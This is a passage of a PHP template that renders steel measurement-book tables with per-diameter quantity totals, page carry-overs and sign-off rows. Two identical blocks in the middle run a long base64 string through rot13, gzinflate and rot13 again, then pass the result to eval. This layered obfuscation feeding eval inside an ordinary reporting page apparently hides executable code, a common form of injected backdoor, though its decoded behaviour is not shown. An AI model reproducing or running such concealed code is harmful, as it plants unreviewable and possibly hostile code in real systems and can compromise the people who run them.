						$WrapReturn1 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn1[0];
						$wrap_cnt1 = $WrapReturn1[1];
				  		$currentline = $currentline + $wrap_cnt1;
							if($currentline>31)
							{ 
								if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
								{
								echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
								}
								echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
								/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
								if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
							}
                        }
                    }
                   if(($prevdate != $List->date) && ($prevsubdiv_name == $List->subdiv_name))
                   {
                       if($prevdate !== "")
                       {
                      $temp = 1;
                       }
                   }
                   if($temp == 1)
                   {
                     $tmb = $sumst;
                     $explodedval = explode("@",$tmb); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
                        }
                     }
                        ?>
                <tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' bgcolor=""></td>
                    <td width='' colspan="4" class='labelcenter' style='text-align:right'>
					<input type="text" class="labelbold" name="txt_pageid" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" style="width:100%; text-align:right; border:none;" />
				</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
                	
                <?php 
				
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				if($prev_sub_type != 'c'){
                $summary1 .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";//echo $summary1;
				//echo $summary1."SSSS<br/>";
				}
				$currentline++;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
                //echo $summary1;
                //THIS PART IS FOR 2 LINE SPACE BETWEEN NEWDATE AND OLD DATE 
                if(($prevdate != $List->date) && ($prevdate !== ""))
                    {
					
                        ?>
                        <tr height='' style="border:none;" class="label" align="right"><td colspan="15" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td></tr>
						<tr height='' style="border:none;" class="label" align="right">
						<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
						<td colspan="6" style="border:none;">Prepared By&nbsp;&nbsp;</td>
						<td colspan="5" style="border:none;">Checked By&nbsp;&nbsp;</td>
						</tr>
                <?php
				$currentline = $currentline+3;
					if($currentline>31)
					{ 
						if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
						{
						echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
						}
						echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
						/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
						if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
                  }
                    ?>
                <tr height=''>
                            <td width='8%' class='labelcenter'><?php echo $List->date; ?></td>
                            <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                            <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                 </tr>
                        <?php 
                         $sumst = "";  
					   	//$length2 = strlen($List->shortnotes);
						//$linecnt2 = ceil($length2/145);
						
						$wrap_cnt2 = 0;
						$WrapReturn2 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn2[0];
						$wrap_cnt2 = $WrapReturn2[1];
				  		$currentline = $currentline + $wrap_cnt2;
						if($currentline>31)
						{ 
							if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
							{
							echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
							}
							echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
							/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
							if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
						}
                  }
				  
				$acc_remarks_str = $List->accounts_remarks;
				//echo $acc_remarks_str."<br/>";
				$exp_acc_remark = explode("@R@",$acc_remarks_str);
				$acc_remarks = $exp_acc_remark[0];
				if($acc_remarks != "")
				{
					$fcolor = "color:#F00000";
					//$class = "tooltip";
					$acc_remarks_count++;
				}
				else
				{
					$fcolor = "";
					//$class = "";
				}
				$accounts_str = $List->mbdetail_id."@#*#@".$List->subdiv_name."@#*#@".$List->descwork."@#*#@".$List->measurement_no."@#*#@".$List->measurement_l."@#*#@".$List->measurement_dia."@#*#@".$totaldia."@#*#@".$List->remarks."@#*#@".$decimal."@#*#@".$acc_remarks."@#*#@".$mbookno;
                
				//$descwork = wordwrap($List->descwork,45,"<br>\n");
				//$wwl = explode("\n", $descwork);
				//$wwlcount = count($wwl);
				//$length3 = strlen(trim($descwork));
				//$linecnt3 = ceil($length3/45); //echo $linecnt3;
				
				$wrap_cnt3 = 0;	
				$WrapReturn3 = getWordWrapCount($List->descwork,50);
				$descwork = $WrapReturn3[0];
				$wrap_cnt3 = $WrapReturn3[1];
				$currentline = $currentline + $wrap_cnt3;
				
				//$currentline = $currentline + $wwlcount;
				?>
                
                <tr height='' style=" <?php echo $fcolor; ?>">
                    <td width='8%' class=''><?php //echo $acc_remarks; ?></td>
                    <td width='4%' class=''>
					<input type="checkbox" name="check" id="ch_item" value="<?php echo $accounts_str; ?>" />
					<?php 
					//echo $List->subdiv_name;//if(($prevdate != $List->date) && ($prevsubdiv_name != $List->subdiv_name)) { echo $List->subdiv_name; } else { echo ""; } 
					?>
					</td>
                    <td width='12%' class='' style="text-align:left;" nowrap="nowrap"><?php echo $descwork; ?></td>
                    <td width='3%' class='' style="text-align:right"><?php echo $List->measurement_dia; ?></td>
                    <td width='3%' class='' style="text-align:right"><?php if($List->measurement_no2 != 0){ echo $List->measurement_no2; } ?></td>
                    <td width='3%' class='' style="text-align:right"><?php if($List->measurement_no != 0){ echo $List->measurement_no; } ?></td>
                    <td width='4%' class='' style="text-align:right"><?php if($List->measurement_l != 0){ echo $List->measurement_l; } ?></td>
                    <?php
        if($measurementdia == 8){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 8; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaeight+=$totaldia; }
                else { ?><td width='7%' class=''></td> <?php }
        if($measurementdia == 10){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 10; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaten+=$totaldia; }    
                else { ?><td width='7%' class=''></td> <?php }           
        if($measurementdia == 12){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 12; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwelve+=$totaldia; }                
                else { ?><td width='7%' class=''></td> <?php }         
        if($measurementdia == 16){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 16; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiasixteen+=$totaldia; }  
                else { ?><td width='7%' class=''></td> <?php }    
        if($measurementdia == 20){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 20; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwenty+=$totaldia; }      
                else { ?><td width='7%' class=''></td> <?php }      
        if($measurementdia == 25){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 25; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyfive+=$totaldia; }     
                else { ?><td width='7%' class=''></td> <?php }  
        if($measurementdia == 28){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 28; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyeight+=$totaldia; }     
                else { ?><td width='7%' class=''></td> <?php }   
        if($measurementdia == 32){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 32; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtytwo+=$totaldia; }             
                else { ?><td width='7%' class=''></td> <?php }
		if($measurementdia == 36){ ?><td width='6%' class='' style="text-align:right"><?php $dia = 36; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtysix+=$totaldia; }             
                else { ?><td width='6%' class=''></td> <?php }		                
                  ?> 
                     <!--<td width='2%' class='labelcenter'><?php //echo $List->remarks; ?></td>-->
                </tr>
                <?php
               
                $prevdate = $List->date;
				$prevpage = $mpage; $prevmbookno = $mbookno;
                $sumst .= $dia."*".$totaldia."@";
                $temp = 0;
				$length3 = strlen($List->descwork);
				$linecnt3 = ceil($length3/20); //echo $linecnt3;
				//$currentline = $currentline + $linecnt3;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				$prevsubdiv_name = $List->subdiv_name;
				if(($sub_type == 'c') && ($meas_no != 0) && ($meas_no != ""))
				{
                $summary1 .= $List->subdiv_name.",".$List->date.",".$mpage.",".$mbookno.","."".",".$List->subdivid.",".$List->div_id.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$decimal.",".$meas_no.",".$sub_type."@";//echo $summary1;
				//echo $summary1."hghfgj<br/>";
				//echo $summary1."SSSS<br/>";
				}
				//echo $sub_type."<br/>";
                $prevsubdivid = $List->subdivid;
				$prev_sub_type = $sub_type;
				$prevdivid = $List->div_id; 
				$prev_decimal = $decimal;
				$tot_8 = "";$tot_10 = "";$tot_12 = "";$tot_16 = "";$tot_20 = "";$tot_25 = "";$tot_28 = "";$tot_32 = "";$tot_36 = "";
                $tot8 = "";$tot10 = "";$tot12 = ""; $tot16 = ""; $tot20 = ""; $tot25 = ""; $tot28 = ""; $tot32 = "";$tot36 = "";
				$txtboxid++;
                } //echo $currentline;
				
	if($mpage > 100)
	{
		/*$currentline = $start_line + 13;
		$prevpage = 100;
		$mpage = $newmbookpageno;
		//$prevpage = $mpage;
		$mbookno = $newmbookno;*/
	}	
                            $tmb2 = $sumst;
                             $explodedval2 = explode("@",$tmb2); 
                             for($i=0;$i<count($explodedval2);$i++)
                             {
                                 if($explodedval2[$i] != "")
                                 {
                                 $expval2 = explode("*",$explodedval2[$i]); 
                                 if($expval2[0] == 8){ $tot8 = $tot8 + $expval2[1]; }
                                 if($expval2[0] == 10){ $tot10 = $tot10 + $expval2[1]; }
                                 if($expval2[0] == 12){ $tot12 = $tot12 + $expval2[1]; }
                                 if($expval2[0] == 16){ $tot16 = $tot16 + $expval2[1]; }
                                 if($expval2[0] == 20){ $tot20 = $tot20 + $expval2[1]; }
                                 if($expval2[0] == 25){ $tot25 = $tot25 + $expval2[1]; }
                                 if($expval2[0] == 28){ $tot28 = $tot28 + $expval2[1]; }
                                 if($expval2[0] == 32){ $tot32 = $tot32 + $expval2[1]; }
								 if($expval2[0] == 36){ $tot36 = $tot36 + $expval2[1]; }
                                 }
                             }//echo $mpage;exit;
                ?>
                <!---   THIS IS FOR LAST ROW TOTAL IN WHILE LOOP -->
				<?php 
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				if($prev_sub_type == 'c')
				{
				//$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.","."".",".$prevsubdivid.",".$prevdivid.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$prev_decimal.",".$prev_meas_no.",".$prev_sub_type."@";
				}
				else
				{
				$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";
				}
				$currentline++;
				$currentline++;
				//if($currentline>38){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 11;$mpage++;}
				if($_SESSION['last_row_check'] == 1)
				{
				?>
				<tr height=''>
                    <td width='' colspan="7" class='labelbold' style='text-align:right'><?php echo "B/f from Page ".$page_check_last_row."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'><?php //echo $mpage; ?></td>-->
                </tr>	
				<?php
				}
				?>
                <tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' bgcolor=""></td>
                    <td width='' colspan="5" class='labelbold' style='text-align:right'>
					<input type="text" name="txt_pageid" class="labelbold" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" style="width:100%; text-align:right; border:none;" />
					</td>
                    <!--<td width='' class='labelcenter'></td>-->
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
